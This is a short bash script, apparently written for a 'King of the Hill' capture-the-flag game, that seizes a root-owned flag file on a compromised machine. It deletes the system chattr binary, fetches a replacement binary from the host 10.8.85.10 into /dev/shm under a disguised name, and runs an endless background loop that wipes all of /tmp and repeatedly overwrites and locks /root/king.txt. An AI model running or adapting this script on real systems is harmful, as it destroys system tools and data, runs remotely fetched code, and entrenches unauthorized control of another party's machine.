rm -rf $(which chattr)
clear_tmp(){
cd /tmp
rm -rf *
}
get_chattr(){
     cd /dev/shm
     wget 10.8.85.10/chattr
     mv chattr asd
     chmod 100 asd
}
get_chattr
while true; do
     if ls -l /dev/shm/asd
          then
               echo OK
          else
               get_chattr
          	echo DONE
     fi
     if ls -l /tmp
          then
               clear_tmp
     fi
     /dev/shm/asd -ia /root
     /dev/shm/asd -ia /root/king.txt 2>/dev/null
     chmod 600 /root/king.txt
     echo -n "lomarkomar" >| /root/king.txt 2>/dev/null
     chmod 200 /root/king.txt
     /dev/shm/asd +ia /root/king.txt 2>/dev/null
     /dev/shm/asd +ia /root
done &
